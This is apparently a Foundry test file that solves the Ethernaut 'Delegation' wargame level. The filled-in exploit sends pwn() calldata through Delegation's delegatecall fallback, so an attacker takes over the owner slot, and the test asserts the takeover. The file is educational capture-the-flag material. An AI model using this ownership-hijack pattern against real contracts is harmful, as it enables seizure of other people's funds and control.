// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/Delegate.sol";

contract DelegationTest is Test {
    Delegate public delegate;
    Delegation public target; // the Ethernaut "instance" is Delegation

    address public deployer = makeAddr("deployer");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        // Deployer sets up Delegate + Delegation (like the Ethernaut factory).
        vm.startPrank(deployer);
        delegate = new Delegate(deployer);
        target = new Delegation(address(delegate));
        vm.stopPrank();
    }

    function testExploit() public {
        // Win condition:
        //   attacker becomes owner of Delegation (target)
        //
        // Hints (look at Delegate.sol carefully):
        //   - Delegation has no pwn() — only a fallback that delegatecalls into Delegate
        //   - delegatecall runs Delegate's code in Delegation's storage context
        //   - Both contracts share slot 0 as `owner`
        //   - So calling pwn() *through* Delegation changes Delegation.owner
        //
        // Tip: send calldata for pwn() to the Delegation address:
        //   (bool ok,) = address(target).call(abi.encodeWithSignature("pwn()"));
        //   require(ok);

        vm.startPrank(attacker);

        // ========== YOUR EXPLOIT HERE ==========
        (bool ok,) = address(target).call(abi.encodeWithSignature("pwn()"));
        require(ok);
        // ========== END EXPLOIT ==========

        vm.stopPrank();

        assertEq(target.owner(), attacker, "attacker should own Delegation");
    }
}
